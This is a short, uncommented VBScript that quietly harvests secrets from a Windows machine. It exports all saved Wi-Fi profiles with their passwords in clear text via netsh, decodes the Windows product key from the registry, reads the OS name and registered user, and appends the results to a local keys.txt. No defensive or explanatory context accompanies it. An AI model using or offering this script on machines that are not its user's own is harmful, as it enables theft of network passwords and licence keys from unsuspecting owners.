Set objShell = CreateObject ("WScript.Shell")
objshell.run "netsh wlan export profile key=clear"
dim iVl()
Set oReg = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\default:StdRegProv")
oReg.GetBinaryValue &H80000002,"SOFTWARE\Microsoft\Windows NT\CurrentVersion","DigitalProductId",iVl
Dim aDPID
aDPID = Array()
For i = 52 to 66
  ReDim Preserve aDPID( UBound(aDPID) + 1 )
  aDPID( UBound(aDPID) ) = iVl(i)
Next
Dim ach
ach = Array("B","C","D","F","G","H","J","K","M","P","Q","R","T","V","W","X","Y","2","3","4","6","7","8","9")
For i = 24 To 0 Step -1
  k = 0
  For j = 14 To 0 Step -1
    k = k * 256 Xor aDPID(j)
    aDPID(j) = Int(k / 24)
    k = k Mod 24
  Next
  spk = ach(k) & spk
  If i Mod 5 = 0 And i <> 0 Then spk = "-" & spk
Next
Set owmis = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\cimv2")
Set colOS = owmis.ExecQuery ("Select * from Win32_OperatingSystem")
For Each objOperatingSystem in colOS
  strOS = objOperatingSystem.Caption
  strRegistered = objOperatingSystem.RegisteredUser
Next
Set fso = WScript.CreateObject("Scripting.FileSystemObject")
Set KO = fso.OpenTextFile("keys.txt", 8, True)
KO.WriteLine(strOS & ", " & spk)
Set fso = Nothing
